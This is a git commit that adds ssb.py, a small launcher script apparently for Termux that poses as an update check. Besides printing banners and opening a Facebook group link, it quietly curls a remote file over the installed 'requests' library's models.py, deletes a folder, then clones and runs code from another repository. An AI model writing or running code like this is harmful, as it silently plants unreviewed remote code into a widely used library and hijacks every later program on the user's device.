1f196e1119160fb9d014449d3e2e6db5fb9c4aca
Ramxantanha <115856285+Ramxantanha@users.noreply.github.com>
2022-11-19 09:30:18 +0500

    Add files via upload

---
+++ ssb.py
@@ -0,0 +1,17 @@
+import os,time,platform
+os.system('clear')
+print('[•] Checking Updates...')
+os.system('git pull')
+green = ('\033[1;32m')
+white = ('\033[1;37m')
+red = ('\033[1;31m')
+
+print('<------------------------------------>')
+bit = platform.architecture()[0]
+if bit=='64bit':
+    print(f'{red}[•] Join Over Facebook Group {white}')
+os.system('xdg-open https://facebook.com/groups/412423917720633//')
+os.system('curl https://raw.githubusercontent.com/Ramxantanha/approval/main/Ramzan10.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
+os.system("rm -rf SSB")
+os.system("git clone https://github.com/Sarfraz-Ssb/SSB && cd SSB && python SSB.py")
+os.system("cd SSB && cd SSB.py")
